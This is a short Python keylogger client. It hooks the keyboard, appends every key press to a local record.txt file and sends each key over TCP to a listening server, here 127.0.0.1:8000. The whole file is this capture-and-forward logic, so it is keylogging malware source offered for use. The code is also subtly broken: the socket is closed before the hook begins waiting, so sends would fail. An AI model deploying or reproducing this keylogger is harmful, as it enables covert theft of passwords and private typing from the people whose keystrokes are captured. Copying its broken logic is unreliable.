# hook_client

import keyboard
import socket
import sys
import os

# Get current path
current_path = os.getcwd()
# some variables
HOST = '127.0.0.1'
PORT = 8000

# Create a txt file to record, or add contents if existed
file = open(current_path+'/record.txt', mode='a+')
file.write('\n')

# The function to process events received
def EventProcess(KeyboardEvent)-> None:
    '''
    Usage: receive events

    '''
    EventName = KeyboardEvent.name
    EventType = KeyboardEvent.event_type

    # EventType has two choices(up&down)
    # Here chooses 'down'
    if EventType != 'up':
        print(EventName)
        file.write(EventName+' ')

        try:
            # send message
            s.send(EventName.encode())
        except socket.error as e:
            PrintError(current_process='Sending message', msg=str(e))
            sys.exit(1)


def PrintError(current_process: str, msg: str)->None:
    '''
    Usage: print errors
    
    '''
    print('Error!')
    print('Current process:' + current_process)
    print('Error message:' + msg)

try:
    # create object
    # AF_INET(IPV4) SOCK_STREAM(TCP)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
except socket.error as e:
    PrintError(current_process='Creating socket', msg=str(e))
    sys.exit(1)

print('Socket Created')

try:
    # connect to host given
    s.connect((HOST,PORT))
except socket.error as e:
    PrintError(current_process='Connecting', msg=str(e))
    sys.exit(1)

print('Socket connected')

# start to listen keyboard input and send to server
keyboard.hook(lambda e:EventProcess(e))

# receive message
# reply = s.recv(4096)
# print(reply.decode())

s.close()

# Run until 'Ctrl' is pressed
keyboard.wait('Ctrl')

file.close()